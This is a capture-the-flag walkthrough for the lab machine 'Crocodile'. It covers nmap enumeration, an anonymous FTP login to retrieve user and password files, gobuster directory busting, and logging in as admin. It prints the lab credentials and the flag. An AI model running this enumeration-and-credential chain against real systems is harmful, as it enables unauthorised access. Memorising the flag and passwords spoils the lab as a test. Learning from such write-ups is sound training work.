# CTF Walkthrough: Crocodile

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** FTP, Gobuster, Directory busting
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -sC 10.129.1.15`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            21/tcp open  ftp     vsftpd 3.0.3
            | ftp-syst:
            |   STAT:
            | FTP server status:
            |      Connected to ::ffff:10.10.14.170
            |      Logged in as ftp
            |      TYPE: ASCII
            |      No session bandwidth limit
            |      Session timeout in seconds is 300
            |      Control connection is plain text
            |      Data connections will be plain text
            |      At session startup, client count was 1
            |      vsFTPd 3.0.3 - secure, fast, stable
            |_End of status
            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
            | -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
            |_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
            80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
            |_http-title: Smash - Bootstrap Business Template
            |_http-server-header: Apache/2.4.41 (Ubuntu)
            Service Info: OS: Unix
            ```

2. Log in to FTP with Anonymous
    - Command: `ftp anonymous@10.129.1.15`

3. In FTP
    - List all files
        - Command: `ls`
            - Output:
                ```
                -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
                -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
                ```
    - Download both files
        - Command: 
            ```
            get allowed.userlist
            get allowed.userlist.passwd
            ```
    - Show contents of the files
        - Command: `cat allowed.userlist`
            - Output:
                ```
                1   │ aron
                2   │ pwnmeow
                3   │ egotisticalsw
                4   │ admin
                ```
        - Command: `cat allowed.userlist.passwd`
            - Output:
                ```
               1   │ root
               2   │ Supersecretpassword1
               3   │ @BaASD&9032123sADS
               4   │ rKXM59ESxesUFHAd
                ```
    - Add 10.129.1.15 to /etc/hosts
        - Command: `sudo vim /etc/hosts`
            - Output:
                ```
                10.129.1.15 crocodile.htb
                ```

    - Directory bust
        - Command: `gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u crocodile.htb -x .php`
            - Output:
                ```
                ===============================================================
                Starting gobuster in directory enumeration mode
                ===============================================================
                ...
                /login.php            (Status: 200) [Size: 1577]
                ...
                ```
    - Log in to `crocodile.htb/login.php`
        - Username: admin
        - Password: rKXM59ESxesUFHAd

    - Get Flag
        - Flag: c7110277ac44d78b6a9fff2232434d16


